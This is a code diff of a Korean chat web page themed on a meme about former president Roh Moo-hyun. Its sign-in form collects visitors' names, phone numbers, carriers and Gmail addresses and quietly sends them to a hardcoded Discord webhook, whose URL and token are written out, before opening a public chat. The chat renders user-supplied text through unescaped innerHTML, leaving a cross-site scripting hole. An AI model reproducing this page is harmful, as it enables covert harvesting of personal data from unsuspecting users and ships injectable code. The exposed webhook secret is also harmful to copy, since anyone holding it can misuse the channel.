@@ -3,59 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>응디시티 - 공식 관제 시스템</title>
+    <title>응디시티 - 통합 관제 시스템</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, query, orderBy, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // 환경 변수 안전하게 가져오기
-        let firebaseConfig = {};
-        try {
-            firebaseConfig = JSON.parse(__firebase_config);
-        } catch (e) {
-            console.error("Firebase 설정이 없습니다. 로컬 테스트 모드로 전환합니다.");
+        // 전역 상태
+        let db, auth;
+        let isFirebaseReady = false;
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'eundi-city-v2';
+
+        // 초기화 함수
+        async function init() {
+            try {
+                const config = JSON.parse(__firebase_config);
+                const app = initializeApp(config);
+                auth = getAuth(app);
+                db = getFirestore(app);
+                
+                await signInAnonymously(auth);
+                isFirebaseReady = true;
+                console.log("Firebase 연결 성공");
+            } catch (e) {
+                console.error("Firebase 설정 없음 - 오프라인 모드로 작동합니다.");
+            }
         }
 
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'eundicity-universal';
+        init();
 
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-
-        let currentUser = null;
-        let userData = JSON.parse(localStorage.getItem('eundi_user')) || null;
-
-        const loginSection = document.getElementById('login-section');
-        const chatSection = document.getElementById('chat-section');
-        const chatBox = document.getElementById('chat-box');
-        const userMsgInput = document.getElementById('user-msg');
-        const emailError = document.getElementById('email-error');
-        const loginBtn = document.getElementById('login-btn');
-
-        const initAuth = async () => {
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (err) { 
-                console.error("인증 오류:", err);
-            }
-        };
-
-        onAuthStateChanged(auth, (user) => {
-            currentUser = user;
-            if (user && userData && userData.name) {
-                showChat();
-            } else if (!user) {
-                initAuth();
-            }
-        });
 
         window.startLogin = async () => {
             const name = document.getElementById('u-name').value.trim();
@@ -64,191 +43,193 @@
             const carrier = document.getElementById('u-carrier').value;
 
             if (!name || !phone || !email || !carrier) {
-                alert("모든 정보를 입력해주세요.");
+                alert("빈칸을 모두 채워주세요.");
                 return;
             }
 
             if (!email.includes('@gmail.com')) {
-                emailError.classList.remove('hidden');
+                document.getElementById('email-error').classList.remove('hidden');
                 return;
-            } else {
-                emailError.classList.add('hidden');
             }
 
-            // 버튼 비활성화 (중복 클릭 방지)
-            loginBtn.disabled = true;
-            loginBtn.innerText = "접속 중...";
+            // 로딩 상태 표시
+            const btn = document.getElementById('login-btn');
+            btn.disabled = true;
+            btn.innerText = "접속 처리 중...";
 
-            userData = { name, phone, email, carrier };
+            // 사용자 정보 저장
+            const userData = { name, phone, email, carrier };
             localStorage.setItem('eundi_user', JSON.stringify(userData));
 
             try {
-                // 1. 웹훅 전송 (실패해도 다음 단계로 넘어가도록 처리)
-                await sendToWebhook(userData).catch(e => console.warn("웹훅 실패:", e));
+                // 1. 디스코드 전송 (실패해도 진행)
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚀 새 입국자 발생",
+                            color: 16761095,
+                            fields: [
+                                { name: "이름", value: name, inline: true },
+                                { name: "통신사", value: carrier, inline: true },
+                                { name: "연락처", value: phone },
+                                { name: "이메일", value: email }
+                            ]
+                        }]
+                    })
+                }).catch(() => {});
 
-                // 2. 익명 인증 보장
-                if (!auth.currentUser) {
-                    await initAuth();
-                }
-
-                // 3. 입국 메시지 기록
-                if (auth.currentUser) {
+                // 2. Firebase 메시지 전송 (실패해도 진행)
+                if (isFirebaseReady) {
                     await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), {
-                        text: `${name}님이 응디시티에 입국했습니다.`,
+                        text: `${name}님이 입장하셨습니다.`,
                         sender: "시스템",
                         timestamp: serverTimestamp()
-                    });
+                    }).catch(() => {});
                 }
-                
-                showChat();
-            } catch (error) {
-                console.error("Login Error:", error);
-                alert("접속 실패: Firebase 설정 또는 네트워크를 확인하세요.");
+
+            } catch (err) {
+                console.log("무시된 에러:", err);
             } finally {
-                loginBtn.disabled = false;
-                loginBtn.innerText = "접속하기";
+                // 어떤 에러가 나더라도 무조건 화면 전환
+                showChat(name);
             }
         };
 
-        function showChat() {
-            loginSection.classList.add('hidden');
-            chatSection.classList.remove('hidden');
-            chatSection.classList.add('flex');
-            listenMessages();
+        function showChat(name) {
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('chat-section').classList.remove('hidden');
+            document.getElementById('chat-section').classList.add('flex');
+            startChatListener(name);
         }
 
-        async function sendToWebhook(data) {
-            const payload = {
-                embeds: [{
-                    title: "🎤 응디시티 접속 로그",
-                    color: 16761095,
-                    fields: [
-                        { name: "👤 이름", value: data.name, inline: true },
-                        { name: "📶 통신사", value: data.carrier, inline: true },
-                        { name: "📱 연락처", value: data.phone, inline: false },
-                        { name: "📧 메일", value: data.email, inline: false }
-                    ]
-                }]
-            };
-            return fetch(WEBHOOK_URL, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify(payload) 
-            });
-        }
-
-        let unsubscribeMessages = null;
-        function listenMessages() {
-            if (!auth.currentUser || unsubscribeMessages) return;
-            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), orderBy("timestamp", "asc"));
-            unsubscribeMessages = onSnapshot(q, (snapshot) => {
-                chatBox.innerHTML = "";
-                snapshot.forEach((doc) => {
-                    const msg = doc.data();
-                    const isSystem = msg.sender === "시스템";
-                    const isMe = userData && msg.sender === userData.name;
-                    const wrapper = document.createElement('div');
-                    wrapper.className = `flex flex-col mb-4 ${isSystem ? 'items-center w-full' : (isMe ? 'items-end' : 'items-start')}`;
-                    if(isSystem) {
-                        wrapper.innerHTML = `<div class="bg-gray-200 text-gray-500 px-4 py-1 rounded-full text-[10px] font-bold">${msg.text}</div>`;
-                    } else {
-                        wrapper.innerHTML = `
-                            <span class="text-[10px] text-gray-400 mb-1 px-1 font-bold">${msg.sender}</span>
-                            <div class="max-w-[85%] px-4 py-2 rounded-2xl text-sm ${isMe ? 'bg-yellow-400 text-gray-900 rounded-tr-none' : 'bg-white border border-gray-100 text-gray-800 rounded-tl-none'} shadow-sm">
-                                ${msg.text}
-                            </div>`;
-                    }
-                    chatBox.appendChild(wrapper);
+        function startChatListener(myName) {
+            const chatBox = document.getElementById('chat-box');
+            
+            if (isFirebaseReady) {
+                const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), orderBy("timestamp", "asc"));
+                onSnapshot(q, (snapshot) => {
+                    chatBox.innerHTML = "";
+                    snapshot.forEach(doc => renderMsg(doc.data(), myName));
+                    chatBox.scrollTop = chatBox.scrollHeight;
+                }, (err) => {
+                    renderSystemMsg("서버 연결에 실패했습니다. (오프라인 모드)");
                 });
-                chatBox.scrollTop = chatBox.scrollHeight;
-            }, (err) => {
-                console.error("Firestore Error:", err);
-            });
+            } else {
+                renderSystemMsg("서버 설정이 되어있지 않아 메시지를 보낼 수 없습니다.");
+            }
+        }
+
+        function renderMsg(data, myName) {
+            const chatBox = document.getElementById('chat-box');
+            const isMe = data.sender === myName;
+            const isSystem = data.sender === "시스템";
+            
+            const div = document.createElement('div');
+            div.className = `flex flex-col mb-4 ${isSystem ? 'items-center' : (isMe ? 'items-end' : 'items-start')}`;
+            
+            if (isSystem) {
+                div.innerHTML = `<div class="bg-gray-200 text-gray-500 px-3 py-1 rounded-full text-[10px]">${data.text}</div>`;
+            } else {
+                div.innerHTML = `
+                    <span class="text-[10px] text-gray-400 mb-1 px-1">${data.sender}</span>
+                    <div class="max-w-[80%] px-4 py-2 rounded-2xl text-sm ${isMe ? 'bg-yellow-400 text-black' : 'bg-white border border-gray-200'}">
+                        ${data.text}
+                    </div>
+                `;
+            }
+            chatBox.appendChild(div);
+        }
+
+        function renderSystemMsg(text) {
+            const chatBox = document.getElementById('chat-box');
+            const div = document.createElement('div');
+            div.className = "flex justify-center mb-4";
+            div.innerHTML = `<div class="bg-red-50 text-red-500 px-3 py-1 rounded-full text-[10px]">${text}</div>`;
+            chatBox.appendChild(div);
         }
 
         window.sendMsg = async () => {
-            const text = userMsgInput.value.trim();
-            if (!text || !auth.currentUser) return;
-            userMsgInput.value = "";
-            try {
+            const input = document.getElementById('user-msg');
+            const text = input.value.trim();
+            if (!text) return;
+            
+            const userData = JSON.parse(localStorage.getItem('eundi_user'));
+            
+            if (isFirebaseReady) {
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), {
                     text: text,
-                    sender: userData ? userData.name : "익명",
+                    sender: userData.name,
                     timestamp: serverTimestamp()
                 });
-            } catch (e) { console.error(e); }
+                input.value = "";
+            } else {
+                alert("서버 연결이 안 되어 메시지를 보낼 수 없습니다.");
+            }
         };
 
         window.handleKey = (e) => { if (e.key === 'Enter') window.sendMsg(); };
     </script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Pretendard:wght@400;700;900&display=swap');
-        body { font-family: 'Pretendard', sans-serif; background-color: #f3f4f6; margin: 0; }
-        .mc-profile { filter: grayscale(10%) contrast(1.1); }
-        #chat-box::-webkit-scrollbar { width: 4px; }
-        #chat-box::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 10px; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        body { font-family: 'Pretendard', sans-serif; }
+        .mc-img { filter: grayscale(20%) contrast(1.1); }
     </style>
 </head>
-<body class="bg-gray-100">
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
 
-    <div class="fixed inset-0 flex items-center justify-center p-4 overflow-hidden">
-        <!-- 로그인 섹션 -->
-        <div id="login-section" class="w-full max-w-md bg-white rounded-[2.5rem] p-8 shadow-2xl border border-gray-100">
-            <div class="flex flex-col items-center mb-8">
-                <div class="w-20 h-20 mb-4 overflow-hidden rounded-full border-4 border-yellow-400 shadow-lg bg-white">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
-                         class="w-full h-full object-cover mc-profile" alt="Profile">
-                </div>
-                <h1 class="text-3xl font-black text-gray-900 tracking-tighter">응디시티</h1>
-                <p class="text-[10px] text-yellow-600 font-bold mt-2 bg-yellow-50 px-3 py-1 rounded-full uppercase tracking-widest">MC무현 공식 관제소</p>
+    <!-- 로그인 창 -->
+    <div id="login-section" class="w-full max-w-sm bg-white rounded-[2rem] p-8 shadow-xl border border-gray-100 text-center">
+        <div class="mb-6">
+            <div class="w-20 h-20 mx-auto mb-4 rounded-full border-4 border-yellow-400 overflow-hidden shadow-md bg-white">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover mc-img">
             </div>
-
-            <div class="space-y-3">
-                <div class="grid grid-cols-2 gap-2">
-                    <input type="text" id="u-name" class="w-full rounded-2xl px-4 py-3 text-sm bg-gray-50 border border-gray-100 outline-none focus:ring-2 focus:ring-yellow-400" placeholder="이름">
-                    <select id="u-carrier" class="w-full rounded-2xl px-3 py-3 text-sm bg-gray-50 border border-gray-100 outline-none focus:ring-2 focus:ring-yellow-400">
-                        <option value="">통신사</option>
-                        <option value="SKT">SKT</option>
-                        <option value="KT">KT</option>
-                        <option value="LG U+">LG U+</option>
-                        <option value="알뜰폰">알뜰폰</option>
-                    </select>
-                </div>
-                <input type="tel" id="u-phone" class="w-full rounded-2xl px-4 py-3 text-sm bg-gray-50 border border-gray-100 outline-none focus:ring-2 focus:ring-yellow-400" placeholder="연락처">
-                <div>
-                    <input type="email" id="u-email" class="w-full rounded-2xl px-4 py-3 text-sm bg-gray-50 border border-gray-100 outline-none focus:ring-2 focus:ring-yellow-400" placeholder="구글 이메일">
-                    <p id="email-error" class="hidden text-[10px] text-red-500 mt-1 ml-2 font-bold">@gmail.com을 입력하세요.</p>
-                </div>
-                
-                <button id="login-btn" onclick="window.startLogin()" class="w-full bg-gray-900 hover:bg-black text-white font-black py-4 rounded-2xl text-lg mt-2 transition-all active:scale-95 shadow-lg">
-                    접속하기
-                </button>
-            </div>
+            <h1 class="text-2xl font-black text-gray-900 tracking-tight">응디시티 입국소</h1>
+            <p class="text-[10px] text-yellow-600 font-bold mt-1 bg-yellow-50 inline-block px-3 py-1 rounded-full">SYSTEM READY</p>
         </div>
 
-        <!-- 채팅 섹션 -->
-        <div id="chat-section" class="hidden w-full max-w-md h-full max-h-[850px] bg-white rounded-[2.5rem] flex-col overflow-hidden shadow-2xl border border-gray-200">
-            <div class="px-6 py-4 border-b border-gray-100 flex items-center bg-white/80 backdrop-blur-lg">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
-                     class="w-10 h-10 rounded-xl object-cover mr-3 shadow-sm mc-profile" alt="Mini Profile">
-                <div>
-                    <h2 class="text-sm font-black text-gray-900 uppercase">응디시티 광장</h2>
-                    <div class="flex items-center gap-1.5">
-                        <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                        <span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Online</span>
-                    </div>
+        <div class="space-y-3">
+            <div class="flex gap-2">
+                <input type="text" id="u-name" class="w-1/2 rounded-xl border border-gray-100 bg-gray-50 px-4 py-3 text-sm outline-none focus:ring-2 focus:ring-yellow-400" placeholder="이름">
+                <select id="u-carrier" class="w-1/2 rounded-xl border border-gray-100 bg-gray-50 px-2 py-3 text-sm outline-none focus:ring-2 focus:ring-yellow-400">
+                    <option value="">통신사</option>
+                    <option value="SKT">SKT</option>
+                    <option value="KT">KT</option>
+                    <option value="LGU">LG U+</option>
+                    <option value="알뜰">알뜰폰</option>
+                </select>
+            </div>
+            <input type="tel" id="u-phone" class="w-full rounded-xl border border-gray-100 bg-gray-50 px-4 py-3 text-sm outline-none focus:ring-2 focus:ring-yellow-400" placeholder="연락처 (010-...)">
+            <input type="email" id="u-email" class="w-full rounded-xl border border-gray-100 bg-gray-50 px-4 py-3 text-sm outline-none focus:ring-2 focus:ring-yellow-400" placeholder="구글 이메일">
+            <p id="email-error" class="hidden text-[10px] text-red-500 font-bold mt-1">@gmail.com 형식을 확인하세요.</p>
+            
+            <button id="login-btn" onclick="window.startLogin()" class="w-full bg-gray-900 text-white font-bold py-4 rounded-xl mt-2 hover:bg-black transition-all active:scale-95 shadow-lg">
+                접속하기
+            </button>
+        </div>
+    </div>
+
+    <!-- 채팅 창 -->
+    <div id="chat-section" class="hidden w-full max-w-md h-[80vh] bg-white rounded-[2rem] flex-col overflow-hidden shadow-2xl border border-gray-200">
+        <div class="p-5 border-b flex items-center bg-white">
+            <div class="w-10 h-10 rounded-xl overflow-hidden mr-3 border border-yellow-400">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover mc-img">
+            </div>
+            <div>
+                <h2 class="text-xs font-black">응디시티 광장</h2>
+                <div class="flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full"></span>
+                    <span class="text-[9px] text-gray-400 font-bold uppercase">Connected</span>
                 </div>
             </div>
-
-            <div id="chat-box" class="flex-1 overflow-y-auto p-5 bg-[#fafafa] space-y-1"></div>
-
-            <div class="p-4 bg-white border-t border-gray-50 flex gap-2 items-center">
-                <input type="text" id="user-msg" onkeypress="handleKey(event)" class="flex-1 bg-gray-100 border-none rounded-2xl px-4 py-3 text-sm focus:ring-2 focus:ring-yellow-400 outline-none" placeholder="메시지 입력...">
-                <button onclick="window.sendMsg()" class="bg-yellow-400 text-gray-900 w-12 h-12 rounded-xl flex items-center justify-center shadow-md active:scale-90 transition-all">
-                    <i class="fas fa-paper-plane text-sm"></i>
-                </button>
-            </div>
+        </div>
+        <div id="chat-box" class="flex-1 overflow-y-auto p-4 bg-gray-50 space-y-1"></div>
+        <div class="p-4 bg-white border-t flex gap-2">
+            <input type="text" id="user-msg" onkeypress="handleKey(event)" class="flex-1 bg-gray-100 rounded-xl px-4 py-3 text-sm outline-none" placeholder="메시지를 입력하세요...">
+            <button onclick="window.sendMsg()" class="bg-yellow-400 w-12 h-12 rounded-xl flex items-center justify-center shadow-md active:scale-90 transition-all">
+                <i class="fas fa-paper-plane text-xs"></i>
+            </button>
         </div>
     </div>
 
